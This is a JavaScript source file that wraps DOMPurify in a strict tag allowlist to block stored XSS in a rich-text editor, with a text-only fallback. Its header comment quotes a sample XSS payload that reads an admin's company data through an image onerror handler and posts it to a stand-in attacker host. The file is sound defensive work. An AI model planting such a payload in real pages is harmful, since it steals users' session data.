// LTP HTML sanitizer — single source of truth for what HTML is allowed to
// reach the DOM. Wraps DOMPurify with a strict allowlist matching exactly
// the tags the rich-text editor's toolbar can produce.
//
// Threat: stored XSS. A member-role user types or pastes malicious HTML
// (e.g. <img src=x onerror="fetch('/api/companies',{credentials:'include'})
// .then(r=>r.json()).then(d=>fetch('https://evil/x',{method:'POST',body:JSON
// .stringify(d)}))">). When an admin views the note, the script runs in the
// admin's session and exfiltrates everything.
//
// Defense in depth:
//   1. Sanitize when the editor saves changes (rich-text-editor.js onInput).
//   2. Sanitize when the editor re-loads existing content (init useEffect).
//   3. Sanitize at every render site that uses dangerouslySetInnerHTML.
//   4. Sanitize at every document.write site (print windows).
//   5. CSP headers from backend block any script that does sneak through.
//
// All callers MUST use LTP_SANITIZE.html() — never call DOMPurify.sanitize
// directly. If we ever swap the library or tighten the allowlist, the
// change happens here once.
(function() {
  // Allowed tags MUST cover what the editor's execCommand buttons emit:
  //   bold/italic/underline/strikeThrough  → <b><i><u><s><strike>
  //   insertUnorderedList/insertOrderedList → <ul><ol><li>
  //   formatBlock H3 / BLOCKQUOTE          → <h3><blockquote>
  // Plus structural elements browsers wrap pasted text in: <p><div><br>.
  // NO attributes are allowed — class/id/style/etc. all stripped. This is
  // strict but the editor doesn't produce any either.
  var ALLOWED_TAGS = ["b", "i", "u", "s", "strike", "p", "div", "br",
                      "ul", "ol", "li", "h3", "blockquote"];
  var CONFIG = {
    ALLOWED_TAGS: ALLOWED_TAGS,
    ALLOWED_ATTR: [],
    KEEP_CONTENT: true,          // strip tags but keep text inside
    ALLOW_DATA_ATTR: false,
    USE_PROFILES: { html: true },
  };

  function html(input) {
    if (input == null) return "";
    // DOMPurify is loaded as a global by index.html. If it failed to load
    // (network error, blocked by CSP, etc.), fall back to text-only: strip
    // ALL tags by treating the input as text content. Defensive — should
    // never happen in production where the script tag has SRI + is required.
    if (!window.DOMPurify) {
      console.error("[LTP] DOMPurify not loaded — falling back to text-only render");
      var tmp = document.createElement("div");
      tmp.textContent = String(input);
      return tmp.innerHTML;
    }
    return window.DOMPurify.sanitize(String(input), CONFIG);
  }

  window.LTP_SANITIZE = {
    html: html,
    ALLOWED_TAGS: ALLOWED_TAGS.slice(),  // expose for diagnostics
  };
})();
